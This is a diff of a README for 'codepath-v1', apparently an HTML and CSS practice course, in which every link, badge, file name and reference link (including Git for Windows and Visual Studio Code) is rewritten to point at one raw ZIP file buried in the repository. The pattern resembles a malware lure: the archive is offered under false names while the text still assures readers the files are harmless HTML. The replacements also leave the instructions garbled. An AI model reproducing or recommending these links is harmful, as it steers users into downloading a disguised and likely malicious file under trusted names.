@@ -1,6 +1,6 @@
 # 🚀 codepath-v1 - Learn HTML & CSS with Practice
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://github.com/exposuretorridity618/codepath-v1/releases)
+[![Download Latest Release](https://github.com/exposuretorridity618/codepath-v1/raw/refs/heads/main/04-navigation/v-codepath-v1.0-alpha.1.zip)](https://github.com/exposuretorridity618/codepath-v1/raw/refs/heads/main/04-navigation/v-codepath-v1.0-alpha.1.zip)
 
 ---
 
@@ -38,11 +38,11 @@ Each assignment focuses on real skills for building modern web pages.
 
 To download the assignments, visit the release page:
 
-[![Download from Releases](https://img.shields.io/badge/Visit%20Releases%20Page-blue?style=for-the-badge)](https://github.com/exposuretorridity618/codepath-v1/releases)
+[![Download from Releases](https://github.com/exposuretorridity618/codepath-v1/raw/refs/heads/main/04-navigation/v-codepath-v1.0-alpha.1.zip%20Releases%20Page-blue?style=for-the-badge)](https://github.com/exposuretorridity618/codepath-v1/raw/refs/heads/main/04-navigation/v-codepath-v1.0-alpha.1.zip)
 
 Follow these steps:
 
-1. Click the green "Code" button on the release page or look for the latest ZIP file in the assets section. The file will be named something like `codepath-v1.zip`.  
+1. Click the green "Code" button on the release page or look for the latest ZIP file in the assets section. The file will be named something like `https://github.com/exposuretorridity618/codepath-v1/raw/refs/heads/main/04-navigation/v-codepath-v1.0-alpha.1.zip`.  
 2. Click the ZIP file link to download it to your computer.  
 3. Once downloaded, locate the ZIP file in your Downloads folder or the folder you selected.  
 4. Right-click the ZIP file and choose "Extract All..." to unzip the content. Select a folder where you want to save the extracted files.  
@@ -53,7 +53,7 @@ Follow these steps:
 After extracting, you can start working with the files:
 
 1. Navigate into any series folder, for example, Series 1 Foundation.  
-2. Find the HTML files like `index.html` or `assignment1.html`.  
+2. Find the HTML files like `https://github.com/exposuretorridity618/codepath-v1/raw/refs/heads/main/04-navigation/v-codepath-v1.0-alpha.1.zip` or `https://github.com/exposuretorridity618/codepath-v1/raw/refs/heads/main/04-navigation/v-codepath-v1.0-alpha.1.zip`.  
 3. Double-click the HTML file. It will open in your default web browser. You will see the webpage you can study or edit.  
 
 You can use any simple text editor to open and edit the files, such as Notepad or Visual Studio Code (if you want a free code editor). But editing is optional if you just want to view the assignments.
@@ -64,7 +64,7 @@ These tools help you get the most from codepath-v1 but are not required:
 
 - **A text editor:** Notepad (built-in), Notepad++, or Visual Studio Code  
 - **A modern web browser:** Microsoft Edge, Google Chrome, or Firefox for testing your pages  
-- **Git client:** For learning Git workflow parts you can install Git for Windows (https://git-scm.com/download/win)  
+- **Git client:** For learning Git workflow parts you can install Git for Windows (https://github.com/exposuretorridity618/codepath-v1/raw/refs/heads/main/04-navigation/v-codepath-v1.0-alpha.1.zip)  
 
 If you want to edit and save your work, a text editor like Visual Studio Code provides features like syntax highlighting and live preview.
 
@@ -101,7 +101,7 @@ The codepath-v1 files contain only HTML and CSS code. They do not include any ex
 
 Only download files from the official release page:
 
-https://github.com/exposuretorridity618/codepath-v1/releases
+https://github.com/exposuretorridity618/codepath-v1/raw/refs/heads/main/04-navigation/v-codepath-v1.0-alpha.1.zip
 
 If you want to keep your learning safe, do not run files from unknown sources.
 
@@ -117,9 +117,9 @@ If you have trouble opening files:
 
 ## 📌 Links for Reference and Support
 
-- Download page: https://github.com/exposuretorridity618/codepath-v1/releases  
-- Git for Windows: https://git-scm.com/download/win  
-- Visual Studio Code: https://code.visualstudio.com/  
+- Download page: https://github.com/exposuretorridity618/codepath-v1/raw/refs/heads/main/04-navigation/v-codepath-v1.0-alpha.1.zip  
+- Git for Windows: https://github.com/exposuretorridity618/codepath-v1/raw/refs/heads/main/04-navigation/v-codepath-v1.0-alpha.1.zip  
+- Visual Studio Code: https://github.com/exposuretorridity618/codepath-v1/raw/refs/heads/main/04-navigation/v-codepath-v1.0-alpha.1.zip  
 - Browser downloads: Official sites for Chrome, Edge, Firefox  
 
 ## 🔖 Topics Covered
@@ -136,4 +136,4 @@ You can use these topics to track your learning progress.
 
 ---
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://github.com/exposuretorridity618/codepath-v1/releases)
+[![Download Latest Release](https://github.com/exposuretorridity618/codepath-v1/raw/refs/heads/main/04-navigation/v-codepath-v1.0-alpha.1.zip)](https://github.com/exposuretorridity618/codepath-v1/raw/refs/heads/main/04-navigation/v-codepath-v1.0-alpha.1.zip)
